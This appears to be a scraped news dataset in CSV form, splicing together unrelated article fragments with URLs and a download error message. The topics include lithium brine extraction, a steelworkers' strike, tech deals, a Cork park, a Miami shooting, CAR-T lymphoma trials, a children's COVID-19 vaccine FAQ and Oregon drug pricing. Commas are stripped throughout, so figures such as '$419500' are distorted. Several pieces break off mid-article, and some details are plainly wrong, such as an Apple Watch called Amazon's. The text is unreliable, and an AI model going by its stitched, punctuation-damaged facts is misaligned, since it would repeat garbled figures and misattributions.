Box's final point was the importance of clearly communicating the company's vision. Unfortunately this is one of those things that are much easier said than done. This is particularly true because visions are often somewhat nebulous by necessity which makes it difficult to get their substance across to those who are supposed to hear it. Still it is difficult to deny the usefulness of communicating a company's vision to its employees. To name an example understanding the vision gives the stakeholders an idea of what the company is about at the highest levels which in turn gives them something by which to evaluate their decisions on the basis of whether they make sense for fulfilling the company's overall aims or not.",,,

And it’s very very saline – about 25% by weight.”

Stringfellow pointed out that there are many materials in the mix that could potentially interfere with the extraction.

“There is a lot of salt meaning a lot of sodium a lot of chloride. There’s also a lot of calcium and magnesium and other things like iron and silicon” he said.

However based on the review he conducted with co-author Patrick Dobson a few ideas seemed feasible.

In their view the most technologically advanced method of lithium extraction is adsorption using inorganic sorbents but other promising technologies are also being developed and could be used in the region one of them being inorganic molecular sieve ion-exchange sorbents which are being applied for extraction of lithium from brines.

Using various extraction techniques lithium chloride can be extracted from the brine then processed into other forms for battery production. (Image by Jenny Nuss courtesy of Berkeley Lab).

The review looked at the published literature and industrial and government reports as well as lithium extraction technology patents.

“We were commissioned by DOE’s Geothermal Technologies Office to conduct an independent analysis of mineral extraction technology in the context of geothermal energy production” Stringfellow said.

“There have been previous reviews of individual fundamental processes but this is to our knowledge the first comprehensive review that looked at the more applied-science side of the process.”

According to the researcher who is an expert on industrial waste treatment and management the Department of Energy is interested in both geothermal energy and the lithium supply chain.

Besides conducting this review Stringfellow and his colleagues at Berkeley’s Lithium Resource Research and Innovation Center have been working on projects focusing on how to determine the chemical composition of hot brine in real-time without needing to cool it down enabling better process control to maximize the efficiency of lithium extraction.

They are also working on a techno-economic analysis with two companies operating at the Salton Sea – Berkshire Hathaway Energy and Controlled Thermal Resources – to see if lithium extraction technologies can be done in a way that makes it cost-competitive with other forms of lithium production.",https://news.google.com/articles/CBMihwFodHRwczovL3d3dy5mb3JiZXMuY29tL3NpdGVzL2plbWltYW1jZXZveS8yMDIxLzEyLzExL3J1cGVydC1tdXJkb2NoLWp1c3QtYm91Z2h0LWEtMjAwLW1pbGxpb24tcmFuY2gtaGVyZS1hcmUtaGlzLW90aGVyLW1lZ2EtcHJvcGVydGllcy_SAQA?hl=en-US&gl=US&ceid=US%3Aen,Rupert Murdoch Just Bought A $200 Million Ranch—Here Are His Other Mega-Properties,ERROR: Article `download()` failed with 403 Client Error: Max restarts limit reached for url: https://www.forbes.com/sites/jemimamcevoy/2021/12/11/rupert-murdoch-just-bought-a-200-million-ranch-here-are-his-other-mega-properties/ on URL https://news.google.com/articles/CBMihwFodHRwczovL3d3dy5mb3JiZXMuY29tL3NpdGVzL2plbWltYW1jZXZveS8yMDIxLzEyLzExL3J1cGVydC1tdXJkb2NoLWp1c3QtYm91Z2h0LWEtMjAwLW1pbGxpb24tcmFuY2gtaGVyZS1hcmUtaGlzLW90aGVyLW1lZ2EtcHJvcGVydGllcy_SAQA?hl=en-US&gl=US&ceid=US%3Aen,https://news.google.com/articles/CBMiT2h0dHBzOi8vZmluYW5jZS55YWhvby5jb20vbmV3cy9qb3NoLWhhcnRuZXR0LXJldmVhbGVkLXdoeS10dXJuZWQtMDUxOTI3NjExLmh0bWzSAQA?hl=en-US&gl=US&ceid=US%3Aen,"Josh Hartnett Explained Why He Turned Down ""Brokeback Mountain"" And Who Was Going To Star In It With Him","Brokeback Mountain is a classic an award-winner and a truly iconic film.

Brokeback Mountain but ultimately had to turn it down. In an interview with news.com.au  actor Josh Hartnett — who also recently opened up about stepping away from Hollywood — revealed that he almost starred in but ultimately had to turn it down.

“Unfortunately I was going to do Brokeback Mountain” he revealed ""And I had a contract with [The Black Dahlia] that I had to film so I had to drop out of it.”

“It was a different film altogether"" Hartnett claimed before mentioning that Joaquin Phoenix was slated to star alongside him in the film. ""But they went on to do it with Heath (Ledger) and Jake (Gyllenhaal).”

“I’ve always wanted to kiss Joaquin so that’s my biggest regret” he also joked.

Some 450 members of United Steelworkers Local 40 have been on strike since Oct. 1. Special Metals Corp. which is owned by Warren Buffet’s massive Berkshire Hathaway worldwide operation is demanding workers take more concessions. “My health care premiums would go from about $285 a month to $1000” striker Jack Johnson told the Militant. “And the company is offering no pay raise at all.”

“I’ve worked in the plant for 17 years. I’m out on disability now but I’m helping out at the union office since I can’t walk the picket line” Michelle Tharpe said. “We’ve gotten so much support from other unions and the community. Members of United Steelworkers Local 14581 have come up every two weeks from Elkhorn City Kentucky with a truckload of donations.”

Tharpe explained she and other workers have a lot of anger against the bosses because of the way they’re treated. When her only son died unexpectedly while she was at work her supervisor told her she had to stay on the job until the end of her shift.

“We’re not going to let them push us around or divide us” picket Barry Gibson a 27-year veteran in the plant told us. “No one has crossed the picket line.” The bosses are trying to use scabs to get production going.

The Dell XPS gaming PC is equipped with an 11th gen Intel Core i5 processor 8GB of RAM 1TB hard drive storage and the RTX 3060 Ti video card. For faster performance we'd definitely recommend adding in an SSD as your boot drive. The low price tag might imply that the RTX 3060 is not up to snuff but nothing could be further from the truth. The RTX 3060 is about 20% faster than the RTX 2060 SUPER and is on par with the RTX 2070. That means it crushes games at 1080p and can handle 1440p and VR gaming as well. That's pretty impressive for a $999 PC no matter how you look at it. It's also future proofed with DLSS 2.0 which as the potential to significantly improve games as long as it is supported.

Microsoft Store has the new Xbox Series X|S wireless controllers in Carbon Black Robot White Shock Blue Pulse Red and Electric Volt for only $49.99.

The price of the Razer Iskur chair has dropped by $50 compared to Black Friday! This is only for the synthetic leather models not the fabric model. The Razer Iskur commands a high price tag for a reason; it's well-engineered with plenty of high quality materials and usable features. It's upholstered in multi-layered synthetic leather that's more durable than PU leather. There's also plenty of high density foam cushioning for gaming marathons. The reticulating lumbar adjustment works well and looks really slick. It also boasts 4D armrests and the nicest rolling casters we've experienced.

The Meta Quest 2 (formerly Oculus Quest 2) has so far been the best value when it comes to VR gaming. It's hundreds of dollars cheaper than its competitors it has phenomenal tracking it doesn't need to be tethered to a PC and it boasts a huge library of games (even Half Life: Alyx is easily playable on the Quest 2). Recently Meta has re-released its Quest 2 VR headset with double the storage (128GB vs 64GB) for the exact same price. If you purchase directly from the Oculus Store you can also get $10 off the Elite Strap with Battery. There's even less of a reason now to pick something else. I purchased a Rift when it first launched played the heck out of it and now own a Quest 2. In my opinion and with price factored in it's far and away the best VR headset to get into Beat Saber.

KFC does explicity state some warnings that you should heed: (1) may result in a craving for fried chicken (2) please do not attempt to eat it and (3) please do not put your face directly into the fire in attempt to smell fried chicken. Believe it or not this isn't a gag; it's an actual legitimate product endorsed by KFC themselves and Enviro-Log is the official manufacturer.

It's nice to see Amazon's latest and greatest watch released less than 2 months ago discounted during the holiday season. $20 isn't a massive discount but it's the best one we'll see from Apple this year. The biggest upgrade the Series 7 has over the Series 6 is the display. It has the same always-on Retina display but it's 20% bigger and features a more crack-resistant front crystal screen. It also adds on even more health-related features like measuring your blood oxygen or taking an ECG.

The differences between the 2nd gen and current 3rd gen model isn't worth the 70% price upcharge: a MagSafe wireless charger and longer battery life.

Pandemic Legacy Season 1 Blue Edition

Buy Two Get One Free Pandemic Legacy Season 1 5 $89.99 save 20% $71.99 at Amazon

Pandemic Legacy Season 1 is an outstanding board game. At BoardGameGeek it topped the chart when it was released and has sat at #2 ever since (Gloomhaven being the only board game that trumped it). Pandemic Legacy is essentially Pandemic with a huge non-linear cooperative campaign attached to it. Most people agree that it's a significant upgrade over the original Pandemic. The game is played across 12-24 sessions lasting about 1-2 hours each and because of the branching nature no two games will be the same. You'll notice that there are two variants of the game: Blue and Red editions. They are the exact same game with different box art. they are made so that some avid gamers can play the game simultaneously with two different groups; the colors make it easier to not confuse the two.

Red Dead Redemption 2 is easily the most polished game out of the bunch with a beautifully rich open world tons of content and compelling characters that drive a story you won't soon forget. The time of cowboys and outlaws may be coming to an end but you'll put up a hell of a fight to continue your way of life. It's easily one of the best games period.

A western may not be appealing to you though. If that's the case take on a fantasy game like The Witcher 3: Wild Hunt. There is so much to do and see in its world that it can be a little overwhelming but it's well worth the time spent it'll take you to do so.

Leading today's roundup of the best tech deals we can find is a new low price for the latest Apple AirPods as the third-gen model of the popular wireless earbuds is currently down to $140 at Amazon . The full discount should appear at checkout. This price is also available at Costco  though you'll need a Costco membership to take advantage of the deal. Either way this is $39 off Apple's MSRP and about $30 off the average street price we've seen since the earbuds launched in October . As of this writing Amazon's listing says the AirPods will ship before Christmas though that could change as more orders are placed.

We've had a pair of the newest AirPods on hand for a couple of weeks. While we don't think they're the absolute best value among wireless earbuds they could still be worthwhile for the right person. Namely if you prefer an ""open-back"" design that rests outside of your ear canal instead of inserting within it the third-gen AirPods have a richer and more balanced sound than most of their peers. They let in too much outside noise to sound better than the best true wireless in-ear headphones but if you find this kind of fit more agreeable that might be worth the trade-off. They're a definite upgrade over the previous AirPods in terms of audio quality; just be aware the wider earpieces here might not fit certain ear shapes as comfortably as the older pair.

In general the third-gen AirPods borrow heavily from the AirPods Pro. The open-back design means there's no active noise cancellation but the earbuds have the same IPX4 water resistance and ""force sensor"" control scheme. The latter still isn't perfect but it's more responsive than merely tapping the earbuds to take calls and pause your music. The same host of Apple-friendly features are here as well: the new AirPods pair quickly with other Apple devices and can automatically switch between them if you say take a call on an iPhone while listening to music on an iPad. The included case supports wireless charging and can power up the earbuds about four times per charge while the earbuds themselves last a little over six hours on their own. That's decent if not world-beating.

The new AirPods are still not ideal for Android users and again there are other true wireless models we like that offer more for the money. But if you're an iPhone owner who can't stand the feeling of in-ear headphones they may be the right fit for you.

If you're all set on the headphone front though our deals roundup also includes a returning Black Friday deal for Google's Ars-approved Pixel 5a phone  a new low price on a board game we like in Mysterium  a Best Buy deal that gives $20 in store credit when you buy a $200 Apple Gift Card and several deals on well-reviewed video games that released earlier this year. You can find all of those and many more deals we like in our full list below.

The Pixel 5 isn't a flagship but that's okay

The Pixel 3 was a great phone for its time but its since been supplanted by the likes of the Pixel 5. Admittedly Google took a step back with the Pixel 5 after seeing the mixed success of the Pixel 4. But this time around Google went back to its roots re-introducing fan-favorite features like the rear-mounted fingerprint scanner. Battery life has vastly improved over the Pixel 4 and you'll still get that amazing camera experience that you won't find anywhere else.

Instead of trying to keep pace with the Samsung's and OnePlus' of the world the Pixel 5 just does a lot of things great without being too flashy. You'll get the mid-tier Snapdragon 765G paired with 8GB of RAM and 128GB of storage. This not only provides plenty of performance even for some of the best Android games but it also provides 5G connectivity.

Going even further Google returns with 15W wireless charging just like the Pixel 4 along with 5W reverse wireless charging for the best wireless earbuds. There's a lot to like about the Pixel 5 with its compact form factor and in a way this feels more like a direct successor to the Pixel 3 than the Pixel 4 ever did.

... And the Pixel 4a is still the better value

Meanwhile the Pixel 4a is a new more affordable alternative that offers a nearly identical experience to that of the regular Pixel 4. It has most of the Pixel 4's best features including its remarkable camera and frequent software updates. In exchange you give up the Pixel 4's glass back for a plastic one and lose some niceties like water resistance wireless charging and Face Unlock. Interestingly you regain the headphone jack and the fingerprint sensor seems like a better unlocking option for the current times.

The Pixel 4a offers up-to-date software an amazing camera and a compellingly low price.

One of the ways Google cut costs with the Pixel 4a is by using a lower-end processor the Snapdragon 730G which translates to slightly longer load times when opening apps and scrolling through the software but it's still reasonably snappy especially when compared to similarly priced options from other manufacturers. One aspect where the Pixel 4a actually performs better than the Pixel 3 or 5 is in battery life with the 4a able to make it through a full day of use with ease.

If photography is your sole priority there's almost no reason to spend the extra money on the Pixel 3 or 5; the 4a has the same main sensor as its pricier counterparts and even carries over features like Night Sight allowing you to take photos far above its price point. You'll miss out on the wide front-facing camera of the Pixel 3 (this was also omitted in the Pixel 5) and the slower chipset and lack of a dedicated image processor means you'll need to wait a bit longer for your photos to process but those are pretty minor tradeoffs for this level of camera performance.

In short the Pixel 4a is the clear choice if you're after a pure Google experience with a limited budget while the Pixel 5 wins out for those in need of 5G connectivity and overall better performance. That doesn't leave much room for the Pixel 3 in the middle; while you can find the Pixel 3 used for around the same price as the 4a these days the latter offers far better battery life and a more durable casing. The Pixel 5 on the other hand is more powerful and features modern appointments. If you're asking ""should I buy the Pixel 3"" we would recommend to skip on it and buy either of these great options instead.

Current generation Google Pixel 5 - 5G 128GB $700 at Best Buy A step back but a welcome one

The Pixel 5 may not offer a flagship-level experience compared to other phones released in 2020 but it still offers the best Pixel experience today. Between Google's continued camera success and a beautiful 90Hz display you'll get everything you could want with this one."

By Elaine Murphy

elaine@TheCork.ie

The first phase of Cork’s newest park which when fully completed will be six times the size of Fitzgerald’s Park will open to the public on Monday. An official opening ceremony will take place in 2022.

Just 2.5 kilometres from the city centre and adjacent to the newly pedestrianised and much-loved Marina this section of the park is defined by an iconic steel pavilion which pays homage to the Munster Showground’s Central Hall which formerly stood at this site and a central plaza made of natural stone and concrete. This plaza area will be used for gatherings and organised events.

Marina Park has two main functions: a major city park with a variety of attractions and it is also a key climate adaptation intervention; acting as a flood storage basin for the south docklands during periods of pluvial flooding (rainfall).

Visitors to the park can look forward to green space for play and relaxation water features lighting seating new pathways bridges and upgraded public parking near Shandon boatclub. Public toilets will be installed before Christmas having been delayed by supply chain issues.

Lord Mayor of Cork Cllr Colm Kelleher said: “This is a fantastic new amenity for the people of the city and for visitors to our city. This park’s design is based upon accessibility for all ages and abilities encouraging physical activity and supporting ecology biodiversity culture and outdoor events. The development of this park also demonstrates how Cork City Council want the nearby Cork City Docklands to be first and foremost a great place to live as well as a great place to work in and invest in”.

The park was designed by OKRA Landscape Architects Utrecht Netherlands with O’ Connor Sutton Cronin ( Consulting Engineers ) and Howley Hayes (Conservation Architects) as part of their team. The park was constructed by Sorensen Civil Engineering Limited Cork with Greenway Landscaping part of their team.

Detailed design is underway on the next phase of Marina Park which will see the development of another 60 acres of parkland from the Atlantic Pond to Blackrock pier leading to the creation of a ‘regional eco park’.

This next phase of Marina Park will include woodland marshland meadows and water.

Ecological trails and resting points will be created through existing forested areas

Managed wetlands including reeds and water gardens will form part of a rich natural landscape

A woodland playground will be constructed within the forest

Meadowlands will be nurtured through planned maintenance and soil improvements which will enhance their biodiversity.

A cultural heritage trail will run through the park including safe public access to the Barrington Folly the old quay walls the slipway at Dundanion Castle and the Ice cave.

Public consultation on phase two of the project is due to take place next Spring with construction beginning the following Autumn subject to planning. Construction will likely take 15 months. Works are scheduled to be completed in Winter 2023.

Marina Promenade: Work is also due to start next year on the upgrade of the nearby Marina which will help integrate Marina Park the upgraded Passage Railway Greenway with the Docklands and Blackrock Village.

The upgraded Marina Promenade which was pedestrianised in the past 18 months will include public lighting hard and soft landscaping dedicated pedestrian and cycle spaces repairs to the quay walls new seating and bike parking which will further encourage walking running and cycling which by providing attractive and safe spaces.

Passage Railway Greenway: Works have been underway since last Spring on the upgrading of the nearby Blackrock-Passage Railway Greenway Phase 1 ( Marina to Mahon). The Blackrock Station heritage footbridge is due to be re-instated across the greenway in the coming weeks. Phase 2 (Mahon to Passage) is currently being designed with construction to commence next year subject to planning consent.

This popular walking and cycling route is generally being widened from 3-5metres new public lighting installed an environmental ‘living corridor’ which encourages biodiversity planted and new access ramps from the Marina Blackrock Rd Skehard Road and Eden built. Phase 1 of the Blackrock-Passage greenway will fully re-open next summer with Phase 2 works to be complete the following year.

Monahan Road: The Monahan Road Extension will provide access to and facilitate the development of the former Ford Distribution Site which has planning permission for a 1000 unit+ residential development.

The project will deliver a high-quality link for all road users including dedicated infrastructure for pedestrians cyclists and bus users in line with the recommendations of the Cork Metropolitan Area Transport Strategy and the Draft City Development Plan.",,,,,,

MIAMI BEACH Fla. – Police in Miami-Dade County are looking for two people in connection with an early morning shooting on Saturday.

According to authorities officers received a call at 6:50 a.m. in reference to a possible shooting inside an apartment at 800 Washington Ave.

When police arrived they found a man suffering from a gunshot wound.

On Saturday night police gave an update and said 25-year-old Jacob Majewski has been identified as a person involved in the shooting.

Police said they also want to locate and speak with 19-year-old Nicole Sky Roe who could be an essential witness.

According to a neighbor all of this happened up on the 12th floor. That is where the neighbor said he woke up to hear loud fighting coming from a neighboring apartment and moments later that is when he heard the sound of gunshots coming from inside that very same unit.

The apartment building is right down the street from Miami Beach Police headquarters.

According to neighbors this building in question is called the Blackstone.

Police said the man who was shot was rushed to Jackson Memorial Hospital by Miami Beach Fire Rescue.

Anyone with information about the shooting is urged to contact Miami-Dade Crime Stoppers at 305-471-TIPS.",https://news.google.com/articles/CBMiTGh0dHBzOi8vYWFwc29ubGluZS5vcmcvanVyeS1zZWxlY3Rpb24taW4tdHJpYWxzLWNvbmNlcm5pbmctc2hhbS1wZWVyLXJldmlldy_SAQA?hl=en-US&gl=US&ceid=US%3Aen,Jury Selection In Trials Concerning Sham Peer Review,"There is an adage that says many cases are won or lost in the process of voir dire or jury selection. Lawrence Huntoon M.D. Ph.D. who has been an expert witness in many trials concerning sham peer review explains how the process works in the winter issue of the Journal of American Physicians and Surgeons.

The origin of voir dire predates the landmark Commentaries on the Laws of England by Sir William Blackstone in the late 1760s writes Dr. Huntoon. Its primary purpose is to exclude potential jurors who will be biased against the physician’s case.

Attorneys try to design questions that help to reveal bias willingness to follow the law attitude toward justice and fairness and reasoning ability. One question proposed by Dr. Huntoon for excluding a juror for cause is “Do you work a night shift?”

“A trial involving sham peer review involves complex issues (medical staff bylaws peer review process National Practitioner Data Bank Health Care Quality Improvement Act and breach of contract/tort claims) which are outside the knowledge and common experience of most jurors.” Many find the explanations to be tedious and boring. “Jurors who work a night shift and who normally sleep during the daytime may find it especially challenging to stay awake during the trial.”

Dr. Huntoon explains the types of challenges the ways in which the process may vary between jurisdictions techniques such as looping and deconditioning and visual clues.

“Voir dire is the most important part of any trial” Dr. Huntoon concludes. “It requires thoughtful strategy and planning…. The more that physicians and their attorneys know about the voir dire process in sham peer review cases the better chance they have of winning their case.”

The Journal of American Physicians and Surgeons is published by the Association of American Physicians and Surgeons (AAPS) a national organization representing physicians in all specialties since 1943.

Anyone wishing to get into the festive spirit visiting a Christmas tree farm is the perfect way to kick start the celebrations.

HampshireLive was welcomed to Wylds Farm in the Hampshire village of Liss located close to the Surrey border.

Wylds Farm is owned and run by Nick Rook-Blackstone and his wife Sophia.

Set at the end of a long track it is nestled in Liss Forest with the mainline train - or “Polar Express” as Nick describes it - occasionally zipping past.

The 35-acre farm has been in the family for 55 years and started out as a dairy farm. The Rook-Blackstones now concentrate solely on their Christmas trees.

Having survived the wrath of the pandemic Wylds Farm Christmas Trees are back bigger and better for 2021 with plenty of family entertainment to keep everyone happy during their day out.

There are around 22000 Christmas trees grown on site at Wylds Farm with each tree going through a seven-year growing cycle.

When it comes to buying your tree there is an area of pre-cut trees if you’d rather not venture out into the plantation.

“Christmas trees need a lot of special treatment” explained Nick. “They are high maintenance and need to be pruned every year fed fertilised and not forgetting the weed and pest control.”

Those keen to pick their own can wander around the 12-acre plantation before selecting their favourite to take home and a member of staff will chop it down.

Nick is a keen myth-buster of so-called ‘non-dropping’ Christmas trees and he says under-floor heating is the worst thing for the trees.

“There’s no such thing as a non-dropper it’s all about how you care for your tree and water it.”

Nick Sophia and the team have transformed the farm into a cosy rustic and magical retreat where the full joys of Christmas can be enjoyed.

The Après Tree Bar is stocked with ales mulled wines and warm winter-spiced apple juice.

While hungry customers can feast on some mouth-watering street food cooked on site.

For the younger visitors there are tractor and trailer rides plus a treasure trail and letterbox where letters to Santa can be posted.

And not forgetting resident Kune Kune pig Sherbet who was abandoned by previous owners. She is a delightful addition to the farm and also helps to clear the ground around the Christmas trees.

So if you’re still debating when to get your tree ahead of the ‘big day’ support local small businesses and get yourself out to a Christmas tree farm this weekend.",,,

But debate could ensue over which drug turned in better results.

Back in June BMS’ Breyanzi became the first CAR-T medicine to post a trial win against standard of care in large B-cell lymphoma (LBCL) patients who had failed just one prior therapy. Specifically in data unveiled Saturday at the American Society of Hematology (ASH) annual meeting investigators said the medicine cut the risk of a so-called event-free survival (EFS) complication by 65.1% in a phase 3 study.

Breyanzi’s magnitude of improvement looks largely in line with a 60.2% showing on a similar EFS measurement that Kite’s Yescarta had previously reported—and confirmed at the ASH event—in its own phase 3 trial in the same second-line LBCL setting.

The FDA has put an application for that Yescarta use under priority review with a target decision date set for April 1 2022 according to Gilead. As for Breyanzi BMS is completing a full evaluation of its data with the intention to file them with regulatory agencies Anne Kerber the company’s head of cell therapy development told Fierce Pharma in an interview.

With the phase 3 data from the ZUMA-7 trial for Yescarta and TRANSFORM trial for Breyanzi CAR-T drugs are now a “juggernaut” that will change more than 20 years of established practice and replace a regimen of high-dose chemotherapy followed by hematopoietic stem cell transplant as the new standard of care for second-line LBCL Jason Westin M.D. the leader of LBCL research at the MD Anderson Cancer Center said in a separate interview. Westin is an investigator in ZUMA-7 and BELINDA which is Novartis’ failed second-line trial for Kymriah.

RELATED: Bristol Myers' cell therapy Breyanzi fresh off an FDA nod eyes earlier lymphoma use with first-in-class win

Gilead’s Yescarta appears to have an upper hand in the battle for CAR-T supremacy given its three-year head start over Bristol’s Breyanzi. In a recent survey Cowen conducted with 20 lymphoma-treating doctors after BMS and Gilead had touted their second-line wins 60% of oncologists chose Yescarta or Gilead’s newer Tecartus as their likely favored CD19 CAR-T product in 2024. Breyanzi was selected by 25% of doctors the analysts said.

Industry experts Cowen spoke with separately suggested they would consider Breyanzi in less-fit patients because of the potentially higher rate of neurotoxicity associated with Yescarta. They would also use the BMS drug in cases where Yescarta manufacturing slots aren’t available as a result of increased demand.

But before the two CAR-T products potentially move up the treatment ladder doctors may want to debate which drug has the better data.

Longer follow-up and larger population

At first glance Breyanzi’s 65.1% advantage on the EFS measurement looks better than Yescarta’s 60.2%. But the Yescarta number came from a median follow-up of over two years while Breyanzi reported an interim analysis of the TRANSFORM trial with 6.2 months of median follow-up.

Kite designed the trial under the FDA's guidance CEO Christi Shaw said in an interview.

“Ours is not an interim look it’s a final outcome with two-year data that we can solidly say this is what just Yescarta does for patients if you use in the second line” she said.

Still MD Anderson’s Westin pointed out that longer follow-up might not make much of a difference because LBCL is a highly aggressive cancer where disease-worsening events tend to happen quite early. Prior studies have typically showed that a CAR-T therapy’s advantage would really show at about six months he noted.

Since the TRANSFORM analysis has passed that point “I think those data are probably mature enough” he argued. “But we do need more follow-up to be sure of it.”

RELATED: Gilead's Kite matches Bristol Myers with Yescarta CAR-T win in earlier lymphoma

Kite's Shaw also touted ZUMA-7 for being the larger trial of the two; TRANSFORM randomized 184 patients while ZUMA-7 enrolled 359 patients.

For her part Kerber argued BMS having already expected a large benefit for Breyanzi “effectively designed … the sample size to avoid too many patients being randomized to an inferior standard of care.”

As for the short follow-up time Kerber said the current data package which also includes results showing Breyanzi trumped standard of care in other markers such as tumor response rate “is so consistent and so compelling that there is no ambiguity in the data.”

Bridging chemo

Another reason why BMS’ Breyanzi could need a longer follow-up lies in its trial design Frank Neumann M.D. Ph.D. Kite’s head of clinical development said during an interview. Unlike Yescarta’s ZUMA-7 trial Breyanzi patients in the TRANSFORM study were allowed to take chemotherapy as bridging treatment before they got the CAR-T.

Neumann compared the Breyanzi protocol to giving someone a head start in a race arguing the extra use of chemo masked Breyanzi’s effect.

“I would definitely consider waiting for their data to get more mature” after the chemotherapy effect potentially wanes off he said.

But BMS’ Kerber said allowing chemo bridging was a way to reach a more diverse patient population. Existing CAR-T drugs aren’t off-the-shelf products. Treatment centers take a patient’s own T cells and send them to manufacturing sites to be processed. The final product will then be shipped back to the center for infusion. The process could take around a month or even longer.

With bridging therapy patients with the most aggressive disease could still enroll in the study Kerber said. The initial chemo use is intended to control the disease and to “widen the spectrum of patients that can be enrolled” she added.

RELATED: Novartis' Kymriah flops in earlier lymphoma use where Gilead Bristol Myers CAR-T rivals succeeded

MD Anderson’s Westin acknowledged the possibility that the lack of bridging chemo might deter people who can’t wait for cells to be manufactured and returned but that didn’t seem to affect ZUMA-7. The two studies enrolled similar percentage of patients—both at about 74%—who were refractory to first-line treatment which is a surrogate for really aggressive disease he noted.

What’s more Novartis’ Kymriah failed in its second-line trial despite allowing for the use of bridging chemo he added.

“Although that is a structural difference in the trials I don’t think we can blame or attribute the outcomes of the studies to the bridging chemotherapy” Westin said.

Difference in event-free survival definition

Another difference between ZUMA-7 and TRANSFORM is their descriptions for the primary endpoint of event-free survival. Both trials count disease progression death or start of a new therapy for EFS. But unlike ZUMA-7 TRANSFORM also includes failure to achieve complete response or partial response as an EFS event.

Westin once again pointed to LBCL being an “explosive cancer” noting that stable disease isn’t common. Patients who don’t respond well to treatment would quickly progress to another therapy. Therefore the difference in EFS description isn’t meaningful he said.

All considered because the outcomes Yescarta and Breyanzi have each shown are “very impressive” Westin said he would like to start the CAR-Ts as the new standard of care in second-line patients that would have been eligible for the ZUMA-7 or TRANSFORM studies once the drugs cross the FDA finish line in the indication.",https://news.google.com/articles/CBMiWmh0dHBzOi8vd3d3LnJ3amJoLm9yZy9ibG9nLzIwMjEvZGVjZW1iZXIvZmFjdHMtYWJvdXQtdGhlLWNvdmlkLTE5LXZhY2NpbmUtZm9yLWNoaWxkcmVuLWFnL9IBAA?hl=en-US&gl=US&ceid=US%3Aen,Facts about the COVID-19 Vaccine for Children Ages 5–11,"en Español

By Dr. Amisha Malhotra Pediatric Infectious Disease Physician at the Bristol-Myers Squibb Children’s Hospital at Robert Wood Johnson University Hospital and Associate Professor of Pediatrics at Rutgers Robert Wood Johnson Medical School and Dr. Uzma N. Hasan Section Chief of Pediatric Infectious Disease at Cooperman Barnabas Medical Center

After months of gathering and studying data the nation’s top health authorities have authorized a COVID-19 vaccine for young children. The U.S. Food and Drug Administration has granted emergency use authorization for the Pfizer-BioNTech COVID-19 vaccine for children ages 5 to 11 and the Centers for Disease Control and Prevention has officially endorsed it as well.

Amid the excitement and hope that this news brings many parents and caregivers still have lingering questions. The bottom line is that the COVID-19 vaccine has been proven both safe and effective for young children. Here are some of the questions we hear most often.

Is this vaccine safe for children?

Yes. The FDA has granted emergency use authorization to the Pfizer vaccine for children ages 5 to 11 because there is significant evidence of its safety and efficacy. A recent study conducted by Pfizer and reviewed by the FDA found that the vaccine prevented more than 90% of infections in children ages 5 to 11. The same study showed no severe adverse reactions associated with the vaccine and only mild side effects.

If COVID-19 isn’t dangerous for children why should I vaccinate my child? How can we be sure the vaccine is safe without knowing long-term effects?

When discussing the benefits and risks of vaccination for young children it’s important to put things into perspective. While it is true that COVID-19 is usually less severe for children it’s a myth that the virus is not at all dangerous for children. Since the start of the pandemic more than 1.8 million children ages 5 to 11 have been infected with COVID-19 and over 8600 of those children have been hospitalized. As the Delta variant became more widespread this age group has accounted for a greater proportion of total cases. There have also been over 5000 cases of multisystem inflammatory syndrome (MIS-C) reported for children ages 5 to 11 and some of those kids have experienced long-term symptoms such as cardiac or neurological problems.

In other words COVID-19 does pose a risk to children and we know the vaccine is effective in preventing illness hospitalization and death. Taken into context the benefits of vaccination for young children outweigh the risks.

Will this vaccine alter my child’s DNA?

No it will not. As the Pfizer-BioNTech vaccine contains mRNA it does not cross into any part of the DNA or cells that affect DNA and other human development cells.

Can children spread the virus even if they don’t have symptoms?

Just like adults children can have COVID but not show any signs or symptoms of the virus — known as asymptomatic infection - and can unknowingly spread the virus to others including loved ones.

Will my child still be able to spread the virus even if he or she is vaccinated?

The risk of a vaccinated child spreading the virus is extremely low. While breakthrough infections are possible the data shows that vaccination significantly decreases a person’s ability to transmit the virus to someone else. Vaccinating your child can help prevent the spread of COVID-19 and protect elderly or vulnerable family friends and neighbors.

What are the side effects of the vaccine?

Some mild side effects are common and may last for 24 to 48 hours after injection. This is the body’s natural response to building strong immunity. In the clinical trial of children ages 5 to 11 the main side effects were swelling at the injection site and headaches.

Other common side effects include:

Fever

Chills

Body aches

Pain redness or itchiness at the injection site

While reports of myocarditis following vaccination initially created fear these instances are extremely rare and most of those affected recovered quickly.

Does my child need the vaccine if they have already had COVID-19?

Yes. Even if your child has already had COVID-19 the vaccine will boost their existing immunity and better protect them from new strains of the virus. The only exception is children who have had MIS-C. Because of the treatment protocol for MIS-C we recommend that children diagnosed with the syndrome wait about three months before being vaccinated.

If my child has long-haul COVID symptoms should they still receive the vaccine?

Yes. We have seen long-haul COVID-19 symptoms disappear or become significantly improved following vaccination in both children and adults.

What if my child turns 12 between receiving the first and second dose of the vaccine?

The answer here varies depending on your child’s individual health history and your pediatrician’s guidance. The vaccine dosage authorized for children ages 5 to 11 is one-third the dose used in older children and adults. If your child receives the smaller dose while they are still 11 and then turns 12 receiving the adult dose for the second shot is typically best practice.

However it’s important to note that the vaccine dosage is not weight-based but carefully calculated for young children’s unique needs. In other words a younger child should not receive the adult dose simply because they are tall for their age or larger than their peers. Speak with your pediatrician to determine the best approach for you and your child.

Who can I speak with to ask specific questions about vaccinating my child?

If you have specific questions or concerns speak with your child’s pediatrician or primary care provider to discuss the vaccine as well as risks of exposure based on his or her specific health condition.

Those are two highlights from Oregon’s latest drug price transparency report which will be released next week. Key points were covered on Wednesday at a meeting that brought together lawmakers experts and officials involved in the drug price transparency program.

Numi Lee Griffith senior policy adviser at the state Department of Consumer and Business Services which oversees the program said the top two most expensive new drugs were Abecma listed at $419500 for a vial and Breyanzi priced at $419500 for a vial. Made by Bristol Myers Squibb they are so-called CAR-T cancer drugs that use the body’s immune system to kill cancer cells.

“Most of the highest-cost drugs that we see tend to be for cancer or for another sort of difficult-to-treat disease that don’t have a lot of treatments out there for them already” Griffith said.

About 60% of the higher-cost new drugs were sold under a brand name and the rest were generics Griffith said.

The state program started in 2018 requires manufacturers by law to annually report new drugs that cost $670 or more for a 30-day supply. Companies have to report price increases of 10% or more a year for a drug costing at least $100 for a 30-day supply. The department also collects payment reports from insurers but those reports are voluntary.

Insured patients rarely pay retail prices but they could face higher co-pays depending on how the insurer classifies the drug or see other cost increases.

“More expensive drugs will be in higher-cost sharing tiers and overall high costs increase premiums market-wide” Numi told the Capital Chronicle in a message. “Uninsured patients and high-deductible patients may have to pay list price for a drug.”

